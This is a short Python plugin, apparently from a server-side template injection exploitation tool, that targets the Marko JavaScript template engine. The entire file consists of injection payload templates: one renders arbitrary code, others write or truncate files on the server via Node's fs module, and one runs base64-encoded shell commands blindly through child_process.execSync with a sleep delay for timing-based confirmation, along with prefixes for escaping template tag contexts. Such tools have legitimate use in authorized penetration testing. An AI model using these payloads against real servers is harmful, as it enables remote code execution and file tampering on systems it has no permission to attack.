from plugins.languages import javascript


class Marko(javascript.Javascript):
    def init(self):
        self.update_actions({
            'render': {
                'render': '${{{code}}}',
                'header': '${{"{header}"}}',
                'trailer': '${{"{trailer}"}}',
            },
            'write': {
                'call': 'inject',
                'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64}','base64'),'binary')}}""",
                'truncate': """${{require('fs').writeFileSync('{path}','')}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${{require('child_process').execSync(Buffer('{code_b64}', 'base64').toString() + ' && sleep {delay}')}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '${"1"', 'closures': javascript.ctx_closures},
            # If escapes require to know the ending tag e.g. <div if(%s)></div>
            # This to escape from <var name=data/> and <assign name=data/>
            {'level': 2, 'prefix': '1/>', 'suffix': ''},
        ])
